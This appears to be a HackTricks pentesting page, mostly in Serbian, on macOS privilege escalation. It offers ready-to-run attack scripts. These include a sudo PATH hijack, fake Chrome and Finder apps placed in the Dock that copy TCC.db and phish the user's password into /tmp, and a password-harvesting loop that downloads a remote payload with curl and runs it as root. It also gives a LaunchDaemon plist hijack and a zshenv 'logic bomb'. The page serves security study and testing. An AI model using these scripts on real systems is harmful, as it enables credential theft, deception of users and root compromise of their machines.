# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste ovde došli tražeći TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Imajte na umu da će **većina trikova za privilege escalation koji utiču na Linux/Unix takođe uticati na** MacOS mašine. Zato pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u tekstu o Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **preuzimanje drugih binarnih datoteka** koje će žrtva i dalje izvršavati prilikom **pokretanja sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Imajte na umu da će korisnik koji koristi terminal vrlo verovatno imati **Homebrew instaliran**. Zato je moguće preuzeti kontrolu nad binarnim fajlovima u **`/opt/homebrew/bin`**.

### Dock Impersonation

Korišćenjem **social engineering** tehnika možete **impersonate**, na primer, Google Chrome unutar Dock-a i zapravo izvršiti sopstveni script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite da li se u Dock-u nalazi Chrome i, ako se nalazi, **uklonite** taj unos, a zatim **dodajte** **fake** **Chrome unos na isto mesto** u Dock nizu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Za to morate **dodati unos lažnog Finder-a na početak Dock niza**.
- Druga opcija je da ga ne postavite u Dock, već ga samo otvorite; „Finder traži kontrolu nad Finder-om“ nije naročito čudno.
- Druga opcija za **eskalaciju na root bez traženja** lozinke pomoću zastrašujućeg prozora jeste da naterate Finder da zaista zatraži lozinku radi izvršavanja privilegovane radnje:
- Zatražite od Finder-a da kopira novi **`sudo`** fajl u **`/etc/pam.d`** (Dijalog za unos lozinke ukazaće da „Finder želi da kopira sudo“)
- Zatražite od Finder-a da kopira novi **Authorization Plugin** (Možete kontrolisati ime fajla, tako da će dijalog za unos lozinke ukazati da „Finder želi da kopira Finder.bundle“)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing kroz zahtev za lozinku + ponovna upotreba sudo-a

Malware često zloupotrebljava interakciju korisnika kako bi **prikupio lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajeni tok:

1. Identifikujte prijavljenog korisnika pomoću `whoami`.
2. **Ponavljajte zahteve za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširajte kredencijal (npr. `/tmp/.pass`) i izvršavajte privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).

Primer minimalnog lanca:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se zatim može ponovo koristiti za **uklanjanje Gatekeeper karantina pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.

## Noviji vektori specifični za macOS (2023–2025)

### Zastareli `AuthorizationExecuteWithPrivileges` je i dalje upotrebljiv

`AuthorizationExecuteWithPrivileges` je označen kao zastareo u verziji 10.7, ali **i dalje radi na sistemima Sonoma/Sequoia**. Mnogi komercijalni updaters pozivaju `/usr/libexec/security_authtrampoline` sa putanjom kojoj se ne veruje. Ako korisnik može da upisuje u ciljnu binarnu datoteku, možete postaviti trojan i iskoristiti legitimni upit:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombinujte sa **masquerading trikovima navedenim iznad** da biste prikazali uverljiv dijalog za lozinku.


### Privileged helper / XPC trijaža

Mnogi moderni macOS privescs trećih strana prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne proverava klijenta**, proverava ga **prekasno** (PID race), ili izlaže **root metodu** koja koristi **putanju ili skriptu pod kontrolom korisnika**. Ovo je klasa bugova koja stoji iza mnogih nedavnih problema u helperima VPN klijenata, game launchera i updatera.

Brza kontrolna lista za trijažu:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Obratite posebnu pažnju na helpers koji:

- nastavljaju da prihvataju zahteve **nakon uninstall-a** zato što je job ostao učitan u `launchd`
- izvršavaju scripts ili čitaju konfiguraciju iz **`/Applications/...`** ili drugih putanja u koje non-root users mogu da upisuju
- oslanjaju se na **PID-based** ili **bundle-id-only** proveru peer-a koja može biti podložna race condition-u

Za više detalja o bugovima u autorizaciji helpers-a pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Nasleđivanje okruženja PackageKit scripts-a (CVE-2024-27822)

Pre nego što je Apple rešio ovaj problem u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je korisnik pokrenuo preko **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG scripts kao root unutar okruženja trenutnog korisnika**. To znači da bi package koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i pokrenuo ga kao **root** kada bi žrtva instalirala package.

Ovo je posebno interesantno kao **logic bomb**: potreban vam je samo foothold na korisničkom nalogu i writable shell startup file, a zatim čekate da korisnik izvrši bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom **ne odnosi na MDM/Munki** deployments, zato što se oni izvršavaju unutar okruženja root korisnika.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ako želite detaljnije da istražite abuse specifičan za installere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ako su LaunchDaemon plist ili njegov `ProgramArguments` target **user-writable**, možete izvršiti privilege escalation tako što ćete ga zameniti, a zatim primorati launchd da ga ponovo učita:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ovo odražava obrazac exploita objavljen za **CVE-2025-24085**, gde je writable plist iskorišćen za izvršavanje attacker koda kao root.

### XNU SMR credential race (CVE-2025-24118)

**Race u `kauth_cred_proc_update`** omogućava lokalnom attackeru da korumpira read-only credential pointer (`proc_ro.p_ucred`) pokretanjem `setgid()`/`getgid()` petlji u više threadova, sve dok ne dođe do torn `memcpy` operacije. Uspešna korupcija obezbeđuje **uid 0** i pristup kernel memoriji. Minimalna struktura PoC-a:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombinujte sa **heap grooming** tehnikom kako biste kontrolisane podatke smestili tamo gde se pokazivač ponovo čita. Na ranjivim buildovima ovo predstavlja pouzdan **local kernel privesc** bez potrebe za SIP bypass zahtevima.

### SIP bypass putem Migration assistant-a („Migraine“, CVE-2023-32369)

Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. **Migraine** bug zloupotrebljava Migration Assistant entitlement `com.apple.rootless.install.heritable` kako bi pokrenuo child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`). Lanac:

1. Dobijte root na aktivnom sistemu.
2. Aktivirajte `systemmigrationd` pomoću posebno kreiranog stanja kako bi pokrenuo binary pod kontrolom napadača.
3. Iskoristite nasleđeni entitlement za izmenu SIP-zaštićenih fajlova, uz persistence čak i nakon reboot-a.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Više Apple daemon-a prihvata **NSPredicate** objekte putem XPC-a i proverava samo polje `expressionType`, koje je pod kontrolom napadača. Kreiranjem predicate-a koji izvršava proizvoljne selektore možete postići **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). Kada se kombinuje sa početnim app sandbox escape-om, ovo omogućava **privilege escalation bez user prompt-ova**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Bilo koji user** (čak i unprivileged user-i) može kreirati i mount-ovati Time Machine snapshot pomoću `-o noowners` i **pristupiti SVIM fajlovima** tog snapshot-a, zaobilazeći ownership provere na aktivnom volume-u. Jedina potrebna privilegija jeste da korišćena aplikacija (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Komande i potpuno objašnjenje nalaze se na TCC bypasses stranici:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Osetljive informacije

Ovo može biti korisno za privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Reference

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
